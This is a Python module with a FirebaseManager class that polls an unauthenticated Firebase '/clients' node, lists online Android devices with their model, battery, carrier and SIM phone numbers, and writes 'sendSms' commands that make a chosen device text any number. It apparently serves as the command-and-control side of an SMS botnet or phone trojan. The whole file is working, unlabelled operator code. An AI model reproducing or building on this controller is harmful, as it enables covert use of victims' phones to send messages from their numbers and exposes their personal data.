import requests
import json
import logging
from typing import List, Dict, Any, Optional

logger = logging.getLogger(__name__)

class FirebaseManager:
    def __init__(self, base_url: str):
        self.base_url = base_url.strip().rstrip('/')
        if not self.base_url.endswith('.firebaseio.com') and not self.base_url.endswith('.firebasedatabase.app'):
            # clean up url if user entered without protocol
            if not self.base_url.startswith('http'):
                self.base_url = f"https://{self.base_url}"

    def get_url(self, path: str) -> str:
        clean_path = path.lstrip('/')
        return f"{self.base_url}/{clean_path}.json"

    def test_connection(self) -> bool:
        """Check if Firebase RTDB is accessible (lightweight, shallow query)."""
        try:
            r = requests.get(f"{self.base_url}/.json?shallow=true", timeout=8)
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Firebase connection error: {e}")
            return False

    def get_all_clients(self) -> Dict[str, Any]:
        """Fetch all clients from /clients node."""
        try:
            r = requests.get(self.get_url('clients'), timeout=15)
            if r.status_code == 200 and r.json():
                return r.json()
            return {}
        except Exception as e:
            logger.error(f"Error fetching clients: {e}")
            return {}

    def get_client_count(self) -> int:
        """Fast count of clients using shallow query."""
        try:
            r = requests.get(f"{self.base_url}/clients.json?shallow=true", timeout=8)
            if r.status_code == 200 and r.json():
                return len(r.json())
            return 0
        except Exception:
            return 0

    def get_online_devices(self) -> List[Dict[str, Any]]:
        """
        Fetch all devices where status is True/online.
        Returns a list of device dicts formatted with details.
        """
        clients = self.get_all_clients()
        online_devices = []
        for dev_id, data in clients.items():
            if not isinstance(data, dict):
                continue
            
            # Check online status (boolean True, string 'true', or 1)
            status = data.get('status')
            is_online = (status is True or status == 'true' or status == 1 or status == 'online')
            
            if is_online:
                sims = data.get('sims', [])
                sim_slots = []
                if isinstance(sims, list):
                    for s in sims:
                        if isinstance(s, dict):
                            carrier = s.get('carrierName', 'Unknown')
                            num = s.get('phoneNumber', 'Unknown')
                            slot = s.get('simSlotIndex', '0')
                            sim_slots.append({'slot': slot, 'carrier': carrier, 'phone': num})
                
                online_devices.append({
                    'id': dev_id,
                    'model': data.get('modelName', 'Unknown Phone'),
                    'battery': data.get('battery', 'N/A'),
                    'android_v': data.get('androidV', 'N/A'),
                    'provider': data.get('service_provider', 'N/A'),
                    'sims': sim_slots,
                    'joined': data.get('joined', 'N/A')
                })
        
        return online_devices

    def send_sms_command(self, device_id: str, to_number: str, message: str, sim_slot: int = 0) -> bool:
        """
        Write the sendSms command to /clients/{device_id}/webhookEvent/sendSms.json
        Format:
        {
            "from": sim_slot (int),
            "isSended": false,
            "message": text,
            "to": phone_number
        }
        """
        payload = {
            "from": int(sim_slot),
            "isSended": False,
            "message": message,
            "to": to_number.strip()
        }
        try:
            url = self.get_url(f"clients/{device_id}/webhookEvent/sendSms")
            r = requests.put(url, json=payload, timeout=8)
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Error sending SMS command to {device_id}: {e}")
            return False

    def clear_sms_command(self, device_id: str) -> bool:
        """Clear the sendSms node for a device."""
        try:
            url = self.get_url(f"clients/{device_id}/webhookEvent/sendSms")
            r = requests.delete(url, timeout=6)
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Error clearing SMS command for {device_id}: {e}")
            return False

    def get_sms_status(self, device_id: str) -> Optional[Dict[str, Any]]:
        """Get the current sendSms state for a device."""
        try:
            url = self.get_url(f"clients/{device_id}/webhookEvent/sendSms")
            r = requests.get(url, timeout=6)
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            logger.error(f"Error reading SMS status for {device_id}: {e}")
            return None
